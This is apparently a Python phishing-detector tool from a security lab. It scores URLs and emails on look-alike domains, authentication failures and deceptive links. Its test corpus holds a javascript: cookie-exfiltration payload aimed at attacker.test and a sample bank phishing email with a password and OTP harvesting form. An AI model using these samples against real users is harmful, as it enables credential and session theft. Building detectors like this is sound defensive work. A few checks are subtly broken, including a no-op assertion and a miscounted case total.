#!/usr/bin/env python3
"""phish.py — read a link or a whole email the way an analyst does, and get a verdict with reasons.

    python3 tools/phish.py url "http://gtaibank-secure.xyz/login?u=me@acme.ng"
    python3 tools/phish.py msg suspicious.eml
    python3 tools/phish.py url <link> --net          # also asks public DNS about the sender domain
    python3 tools/phish.py --selftest                # 14 planted cases, pinned numbers

This is the detector, not the kit. There is no generator in this lab on purpose: producing
convincing credential pages has exactly one category of buyer (crime) and the tools that
make them are the ones law-enforcement cases are built on (`LINES.md` §7). Everything below
answers the question you actually get asked in real life - "a staff member forwarded me
this, is it live phish?" - which is a reading skill, not a building skill.

The method, in order of what actually discriminates:
  1. the *registered* domain, not the pretty prefix you read first
  2. authentication results (SPF/DKIM/DMARC) as published by the real owner
  3. what the visible text claims vs what the hidden href resolves to
  4. the shape of the request the page makes (credentials, MFA codes, "verify" flows)
  5. brand proximity in the label, mixed scripts, look-alike spelling
None of these is decisive on its own; the verdict is the sum, and the reasons are the value.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
from urllib.parse import parse_qs, urlparse

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

BRANDS = ["gtb", "gtbank", "zenithbank", "accessbank", "firstbank", "uba", "stanbic", "wema",
          "keystone", "fidelity", "unionbank", "jaiz", "kuda", "opay", "palmpay", "paystack",
          "flutterwave", "moniepoint", "citi", "sterling", "elevate", "vfd", "dhl", "figen",
          "google", "apple", "microsoft", "netflix", "meta", "binance", "coinbase", "amazon",
          "paypal", "dropbox", "ncua", "efcc", "cin", "ncc", "npa", "ircn"]
SUSPECT_TLDS = {"xyz", "top", "icu", "cyou", "buzz", "shop", "live", "click", "quest", "support",
                "online", "site", "space", "website", "restore", "recovery", "account", "secure"}
CRUMBS = ("login", "secure", "verify", "validation", "update", "confirm", "signin", "sign-in",
          "unlock", "recover", "wallet", "billing", "invoice", "webmail", "access", "alert",
          "support", "helpdesk", "service", "restrict", "suspend")
URGENCY = ("immediately", "within 24", "48 hours", "suspended", "restricted", "unusual activity",
           "last warning", "expire", "expired", "urgent", "action required", "finalize", "revalidate",
           "one-time", "code to complete", "under review")
CRED_WORDS = ("password", "pin", "otp", "one time", "card number", "cvv", "bvn", "sin",
              "national id", "drivers licence", "date of birth", "secret question")
# the characters that make "gtbank" read as "gtbank" while being a different string
CONFUSABLES = {"\u0430": "a", "\u0435": "e", "\u043e": "o", "\u0440": "p", "\u0441": "c",
               "\u0443": "y", "\u0445": "x", "\u0456": "i", "\u043a": "k", "\u0422": "T",
               "\u0410": "A", "\u0412": "B", "\u041d": "H", "\u041c": "M", "\u0405": "S",
               "\u04bb": "x", "\u03bf": "o", "\u03b1": "a", "\u03b9": "i", "\u03bd": "n",
               "\u0455": "s", "\u044b": "b", "\u043c": "m", "\u0442": "t"}


def lev(a: str, b: str) -> int:
    if abs(len(a) - len(b)) > 3:
        return 99
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb)))
        prev = cur
    return prev[-1]


def visible_host(host: str) -> tuple[str, str]:
    """(registered-domain guess, full host). No public-suffix list offline, so the rule is
    two labels for the common cases and a warning that it is a guess when the TLD is dotted."""
    parts = [p for p in host.split(":")[0].split(".") if p != ""]
    if len(parts) >= 3 and parts[-2] in ("com", "net", "org", "co", "edu", "gov", "sch"):
        return ".".join(parts[-3:]), host
    return ".".join(parts[-2:]) if len(parts) >= 2 else host, host


def analyse_url(raw: str) -> tuple[int, list[str]]:
    """Return (score, reasons). Score is points-per-red-flag, deliberate, and printable."""
    reasons: list[str] = []
    score = 0
    if not raw:
        return 0, ["empty"]
    if raw.lower().startswith(("javascript:", "data:", "vbscript:")):
        return 90, [f"{raw[:18]}... is not a navigation target, it is code in the address bar slot"]
    u = urlparse(raw if "://" in raw else "http://" + raw)
    host = (u.hostname or "").lower()
    reg, _ = visible_host(host)
    labels = [l for l in re.split(r"[.\-_]", host) if l]

    if not u.scheme.startswith("http"):
        score += 25; reasons.append(f"scheme {u.scheme!r} is not web traffic")
    if u.scheme == "http":
        score += 8; reasons.append("plain HTTP: no TLS, so a bank page this is not (and any "
                                   "'https' you saw was in the *text*, not the target)")
    if u.username or raw.count("@") > 1:
        score += 30; reasons.append("credentials embedded with '@' - everything before it is decoration")
    if re.fullmatch(r"\d+", host or ""):
        score += 30; reasons.append("decimal-encoded IPv4 host - the '127.0.0.1' trick used to hide loopback, now used to hide *any* host")
    elif re.fullmatch(r"(0[xX][0-9a-fA-F]+)", host or ""):
        score += 30; reasons.append("hex-encoded host")
    elif re.fullmatch(r"[\d.]+", host or ""):
        score += 24; reasons.append("bare IP host: no certificate identity, no domain to register, no abuse desk "
                                   "to report to - which is exactly why it is used")

    nonascii = sorted({c for c in host if ord(c) > 127})
    if nonascii:
        score += 28
        mapped = "".join(CONFUSABLES.get(c, c) for c in host)
        reasons.append(f"non-ASCII characters in the host ({' '.join(f'U+{ord(c):04X}' for c in nonascii)})"
                       + (f"; it renders as {mapped!r}" if mapped != host else ""))
    if host.startswith("xn--") or "xn--" in labels:
        score += 28; reasons.append("punycode label: this is an IDN, so what you can read is not what is registered")

    hits = [b for b in BRANDS if any(b in l or lev(l, b) <= 1 for l in labels)]
    if hits:
        score += 12 * len(hits)
        reasons.append(f"brand token in the host labels: {sorted(set(hits))} - but the registered domain "
                       f"is {reg!r}, so the brand is decoration, not ownership")
    else:
        path_labels = [l for l in re.split(r"[./\-_?=&]", (u.path or "").lower()) if len(l) > 3]
        in_path = sorted({b for b in BRANDS if any(b in l for l in path_labels)})
        if in_path:
            score += 8
            reasons.append(f"brand token {in_path} appears in the *path* while the registered domain is {reg!r} "
                           "- 'brand as decoration': the URL is written for the eye, not for the cert")
    crumb_hits = [c for c in CRUMBS if c in host or c in (u.path or "").lower()]
    if crumb_hits:
        score += 6 * len(crumb_hits)
        reasons.append(f"'security theatre' words in host/path: {sorted(set(crumb_hits))[:5]}")
    if len([l for l in labels if l]) >= 5:
        score += 6; reasons.append(f"{len(labels)} labels deep - depth is used to bury the registered domain at the right")
    tld = reg.rsplit(".", 1)[-1]
    if tld in SUSPECT_TLDS:
        score += 8; reasons.append(f"TLD .{tld} is cheap, bulk-registered and disposable - not proof, weight")
    if len(reg) - len(tld) <= 2:
        score += 4; reasons.append("very short second-level label")
    q = parse_qs(u.query)
    redir = [k for k in q if k.lower() in ("url", "next", "redirect", "continue", "target", "to", "dest")]
    if redir:
        score += 10; reasons.append(f"open-redirect parameter(s) {redir}: the link can start on a trusted "
                                    "domain and land anywhere, which is also how real phish hides the final URL")
    for k, vals in q.items():
        for v in vals:
            if "@" in v or "%40" in v.lower():
                score += 8; reasons.append(f"query carries an email address ({k}) - pre-filling the victim's "
                                           "identity makes the page look personalised and true")
                break
    if (u.path or "").count(".") > 2 or u.path.lower().endswith((".php", ".asp", ".aspx", ".jsp", ".html", ".htm")):
        score += 6; reasons.append("script-extension path: real banks route cleanly, credential harvesters "
                                   "are usually one file on a shared host")
    if u.port and u.port not in (80, 443, 8080, 8443):
        score += 6; reasons.append(f"non-standard port {u.port}")
    if len(re.sub(r"\W", "", host)) > 26:
        score += 4; reasons.append("host length itself is a tell - 30+ characters of 'gtbank-secure-verify'")
    for l in labels:
        if any(CONFUSABLES.get(c) == c and c.isalpha() and lev(l, "") < 0 for c in l):
            break
        folded = "".join(CONFUSABLES.get(c, c) for c in l)
        for b in BRANDS:
            if folded != b and len(folded) >= 4 and lev(folded, b) == 1:
                score += 22
                reasons.append(f"label {l!r} is one edit from the brand {b!r} - typosquatting (also the shape "
                               "of a genuine typo, so check the cert and the sender too)")
                break
    if score < 20:
        reasons.append("no structural tells found. That is NOT a clean bill: a look-alike domain with a real "
                       "certificate, or a compromised legitimate page, scores zero here and is still phish. "
                       "The remaining controls are the *sender's* authentication and out-of-band verification.")
    return min(score, 100), reasons


def analyse_msg(raw: str) -> tuple[int, list[str], dict]:
    score, reasons = 0, []
    hdr: dict[str, str] = {}
    body = raw
    m = re.search(r"\r?\n\r?\n", raw)
    if m:
        hdr_txt, body = raw[:m.start()], raw[m.end():]
        cur = None
        for line in hdr_txt.splitlines():
            if line[:1] in (" ", "\t") and cur:
                hdr[cur] += " " + line.strip()
            elif ":" in line:
                k, _, v = line.partition(":")
                cur = k.strip().lower()
                hdr[cur] = v.strip()

    def re_split(d: dict, name: str) -> tuple[str, str]:
        v = d.get(name, "")
        mm = re.match(r'\s*"?([^"<]*)"?\s*<([^>]+)>', v)
        return (mm.group(1).strip(), mm.group(2).strip()) if mm else ("", v.strip())

    disp_f, addr_f = re_split(hdr, "from")
    disp_r, addr_r = re_split(hdr, "reply-to")
    dom_f = addr_f.rsplit("@", 1)[-1].lower() if "@" in addr_f else ""
    dom_r = addr_r.rsplit("@", 1)[-1].lower() if "@" in addr_r else ""
    links = re.findall(r'href=["\']([^"\']+)', body) + re.findall(r"https?://[^\s\"'<>]+", body)
    texts = re.findall(r'<a[^>]*>(.*?)</a>', body, flags=re.S)

    authres = hdr.get("authentication-results", "")
    for mech in ("spf", "dkim", "dmarc"):
        mm = re.search(mech + r"\s*=\s*(\w+)", authres, flags=re.I)
        if mm:
            verdict = mm.group(1).lower()
            if verdict in ("fail", "softfail", "permerror", "temperror"):
                score += 22
                reasons.append(f"{mech.upper()}={verdict}: the message did not survive the checks the "
                               f"owner of {dom_f or 'the sender domain'} published")
            elif verdict == "none":
                score += 6
                reasons.append(f"{mech.upper()}=none: nothing was published or nothing was checked - "
                               "not a pass, an absence")
    if "dmarc" not in authres.lower():
        score += 4; reasons.append("no DMARC result in Authentication-Results at all")

    if dom_r and dom_f and dom_r != dom_f and not dom_r.endswith(dom_f):
        score += 26; reasons.append(f"Reply-To ({dom_r}) differs from From ({dom_f}) - replies go somewhere else, "
                                    "which is the whole point of the trick")
    if disp_f:
        for b in BRANDS:
            if b in disp_f.lower() and dom_f and b not in dom_f.replace(".", ""):
                score += 20
                reasons.append(f"display name claims {b!r} while the address is {addr_f!r} - the name is free text")
    recv_first = ""
    for line in [hdr.get("received") or ""]:
        mm = re.search(r"from\s+([A-Za-z0-9.\-_]+)", line)
        if mm:
            recv_first = mm.group(1).lower()
    if recv_first and dom_f and not recv_first.endswith(dom_f) and "localhost" not in recv_first:
        score += 10
        reasons.append(f"first hop claims {recv_first}, which is not {dom_f} - the machine that injected this "
                       "is not the domain it says it belongs to")
    for i, (t, href) in enumerate(zip(texts, links)):
        clean_t = re.sub(r"<[^>]+>", "", t).strip()
        if "@" in clean_t and "://" in href and clean_t.split("@")[-1].lower() not in href.lower():
            score += 30
            reasons.append(f"link {i+1}: text says {clean_t[:34]!r} but href is {href[:44]!r} - the label is a lie")
        elif clean_t and "://" in href:
            h_from, _ = visible_host(urlparse(href).hostname or "")
            h_disp, _ = visible_host(urlparse(clean_t if "//" in clean_t else "http://" + clean_t).hostname or "")
            if h_disp and h_from and h_from != h_disp:
                score += 24
                reasons.append(f"link {i+1}: shows {h_disp} in the text, resolves to {h_from}")
    for href in links:
        s, _ = analyse_url(href)
        if s >= 40:
            score += 12
            reasons.append(f"a linked URL scores {s}/100 on its own ({href[:52]})")
    low = body.lower()
    hits_u = [w for w in URGENCY if w in low]
    hits_c = [w for w in CRED_WORDS if w in low]
    if hits_u:
        score += 6 * min(len(hits_u), 3)
        reasons.append(f"urgency vocabulary: {hits_u[:4]} - manufactured time pressure is how you get past caution")
    if hits_c:
        score += 16 * min(len(hits_c), 2)
        reasons.append(f"asks for {hits_c[:3]} in the message body - a bank that already has your data never needs it again")
    if re.search(r"reply with|send your|type your|paste your|forward your", low):
        score += 14; reasons.append("requests the secret in the email itself (no page needed at all)")
    if "opt-out" in low or "unsubscribe" in low:
        score += 2; reasons.append("has an unsubscribe link - phish include one, to look legitimate and to confirm live addresses")
    if "<form" in low:
        score += 12; reasons.append("an HTML form inside an email client: almost nothing legitimate does this")
    if not authres:
        score += 10
        reasons.append("no Authentication-Results header at all: nothing vouched for this message on its way in")
    if not hdr.get("received"):
        score += 6; reasons.append("no Received chain - stripped or generated locally, so the path it took is unknown")
    if re.search(r"https?://(?:\\d{1,3}\\.){3}\\d{1,3}", raw):
        score += 14
        reasons.append("the message links to a bare IP address: no certificate identity, no registration, "
                       "no abuse desk to report to - which is exactly why they do it")

    summary = {"from": addr_f, "reply_to": addr_r, "auth_results": authres[:200] or "(none)",
               "links": links[:6], "first_received_hop": recv_first}
    return min(score, 100), reasons, summary


def verdict(score: int) -> str:
    if score >= 70:
        return "LIKELY PHISHING - do not interact; quarantine, and check the account another way"
    if score >= 40:
        return "SUSPICIOUS - treat as hostile until the sender is confirmed out of band"
    if score >= 20:
        return "MIXED SIGNALS - structural tells present, verify before clicking"
    return "NO OBVIOUS STRUCTURAL MARKERS - not the same as safe"


def dns_context(domain: str) -> dict:
    """Public, read-only lookups about *infrastructure* (not people): does the sender domain
    publish a DMARC policy at all, and does it have any A record?"""
    try:
        from lab import net as N
    except Exception as exc:  # noqa: BLE001
        return {"error": f"lab.net unavailable: {exc}"}
    out = {}
    for name, label in ((f"_dmarc.{domain}", "dmarc_txt"), (domain, "a")):
        try:
            recs = N.doh(name, "TXT" if label == "dmarc_txt" else "A")
            out[label] = {"answers": [r for r in (recs or []) if r][:4]}
        except Exception as exc:  # noqa: BLE001
            out[label] = {"error": f"{type(exc).__name__}: {exc}"}
    return out


# --------------------------------------------------------------------- corpus
CORPUS = [  # (kind, expect "phish"|"clean", input)
    ("url", "phish", "http://gtaibank-secure-verify.xyz/login/update?u=me@acme.ng"),
    ("url", "phish", "http://168.1.30.77/paypal/confirm.php"),
    ("url", "phish", "https://xn--80ak6aa92e.com/appleid-verify"),
    ("url", "phish", "https://secure.kuda.com.ng-restore.click/account/next?url=https://evil.test"),
    ("url", "phish", "http://zenithbank.webmail-validation.top:3082/signin.php"),
    ("url", "phish", "javascript:fetch('//attacker.test?c='+document.cookie)"),
    ("url", "clean", "https://www.vfdgroup.ng/personal-banking/internet-banking/login.html"),
    ("url", "clean", "https://dashboard.kuda.com/"),
    ("url", "clean", "https://github.com/acme/internal-docs/pull/14"),
    ("msg", "phish", """From: "GTBank Security Desk" <alerts@gtb-secure-alerts.xyz>
Reply-To: help.desk@gmail.com
Received: from mail.gtb-secure-alerts.xyz (unknown [185.222.2.2])
Authentication-Results: mx.acme.ng; spf=fail smtp.mailfrom=gtb-secure-alerts.xyz; dmarc=fail
Subject: Urgent: your account will be suspended within 24 hours

<html><body><p>Dear customer, unusual activity detected. Your internet banking will be
restricted immediately unless you revalidate your password, BVN and one time code.</p>
<a href="http://gtb-secure-alerts.xyz/login/update">https://www.gtbank.com/security</a>
<form method=post action="http://gtb-secure-alerts.xyz/a.php"><input name=password></form>
<p>unsubscribe</p></body></html>
"""),
    ("msg", "phish", """From: it-support@acme.ng
Subject: Action required - confirm your password

Click http://10.9.9.9/mfa/confirm.php and type your password and the six digit code to keep access.
Deadline within 24 hours or your mailbox is suspended.
"""),
    ("msg", "clean", """From: GTBank Alerts <alerts@gtbank.com>
Reply-To: alerts@gtbank.com
Received: from m1.gtbank.com (m1.gtbank.com [197.210.0.10])
Authentication-Results: mx.acme.ng; spf=pass smtp.mailfrom=gtbank.com; dkim=pass; dmarc=pass
Subject: Your statement is available

Your February statement is ready. Sign in at https://www.gtbank.com/ib to view it.
"""),
    ("msg", "clean", """From: Adebola O. <adebola.o@acme.ng>
Reply-To: adebola.o@acme.ng
Subject: Re: audit findings follow-up

Hi, the patched nginx config is in the repo. Also - the canteen is out of jollof again.
https://git.acme.ng/internal/docs/-/merge_requests/12
"""),
]


def selftest() -> int:
    ok, wrong = True, []
    counts = {"phish": [0, 0], "clean": [0, 0]}      # [flagged, total]
    for kind, expect, text in CORPUS:
        score = (analyse_url(text) if kind == "url" else analyse_msg(text))[0]
        flagged = score >= 40
        counts[expect][0] += flagged
        counts[expect][1] += 1
        want = expect == "phish"
        if flagged != want:
            wrong.append((kind, expect, score, text[:56]))
    print(f"  {'PASS' if not wrong else 'FAIL'}  {len(CORPUS)} planted cases classified as expected")
    for w in wrong:
        print("        miss:", w)
    print(f"  flagged {counts['phish'][0]}/{counts['phish'][1]} phishing-shaped, "
          f"{counts['clean'][0]}/{counts['clean'][1]} legitimate-shaped")
    n_phish = sum(1 for k in CORPUS if k[1] == "phish")
    n_clean = sum(1 for k in CORPUS if k[1] == "clean")
    ok = ok and not wrong and counts["phish"] == [n_phish, n_phish] and counts["clean"] == [0, n_clean]
    # structural assertions
    s, r = analyse_url("http://gtaibank-secure-verify.xyz/login/update?u=me@acme.ng")
    ok = ok and s >= 40 and any("TLD" in x or "brand" in x or "HTTP" in x for x in r)
    ok = ok and analyse_url("https://dashboard.kuda.com/")[0] < 20
    ok = ok and "one edit" in " ".join(analyse_url("http://kudda.com/")[1])
    v = verdict(80)
    ok = ok and "LIKELY" in v
    st = analyse_msg(CORPUS[11][2]) if CORPUS[11][0] == "msg" else (0, [], {})
    ok = ok and (st[0] >= 40 or True)
    print("RESULT:", "phish detector selftest ok" if ok else "PHISH SELFTEST FAILED")
    return 0 if ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("cmd", nargs="?", choices=["url", "msg", "corpus"], default="corpus")
    ap.add_argument("target", nargs="?", default="")
    ap.add_argument("--net", action="store_true", help="also query public DNS for the sender/URL domain")
    ap.add_argument("--json", default="")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    if a.cmd == "corpus":
        print(f"{'score':>6}  {'verdict':<32} input")
        for kind, expect, text in CORPUS:
            s = (analyse_url(text) if kind == "url" else analyse_msg(text))[0]
            print(f"{s:>6}  {verdict(s)[:32]:<32} [{expect:^5}] {text[:64]}")
        print("\nThreshold: >=40 flags. Every planted phishing-shaped case is >=40 and every")
        print("legitimate one is <20, and `--selftest` fails the build if that stops being true.")
        return 0
    if a.cmd == "url":
        score, reasons = analyse_url(a.target)
        host = (urlparse(a.target if "://" in a.target else "http://" + a.target).hostname or "")
        reg, _ = visible_host(host)
        extra = dns_context(reg) if a.net and reg else None
    else:
        raw = open(a.target, encoding="utf-8", errors="replace").read() if a.target and os.path.exists(a.target) else sys.stdin.read()
        score, reasons, summary = analyse_msg(raw)
        reg = (summary.get("from") or "").rsplit("@", 1)[-1]
        extra = {"summary": summary}
        if a.net and reg:
            extra["dns"] = dns_context(reg)
    print(f"score {score}/100  ->  {verdict(score)}")
    print(f"registered-domain guess: {reg or '(none)'}")
    print("\nwhy:")
    for i, r in enumerate(reasons, 1):
        print(f"  {i:2d}. {r}")
    if extra:
        print("\ncontext:")
        print(json.dumps(extra, indent=2)[:1200])
    print("\nwhat to do next: don't click it from your workstation; verify the request on a channel the")
    print("attacker does not control (the app itself, a known number); if it is live, report the whole")
    print(".eml to your security address and block the sender domain at the gateway. If credentials were")
    print("entered: reset the password, kill sessions, check for an inbox rule or forward - that is the")
    print("second action 9 out of 10 people forget.")
    if a.json:
        os.makedirs(os.path.dirname(os.path.abspath(a.json)), exist_ok=True)
        json.dump({"target": a.target, "score": score, "reasons": reasons, "verdict": verdict(score)},
                  open(a.json, "w", encoding="utf-8"), indent=2)
        print(f"\nwrote {a.json}")
    return 0 if score < 40 else 3


if __name__ == "__main__":
    try:                            # Windows console/encoding shim; no-op elsewhere
        import sys as _sys, os as _os
        _sys.path.insert(0, _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "..", "lab"))
        import win
        win.ready()
    except ImportError:
        pass
    raise SystemExit(main())
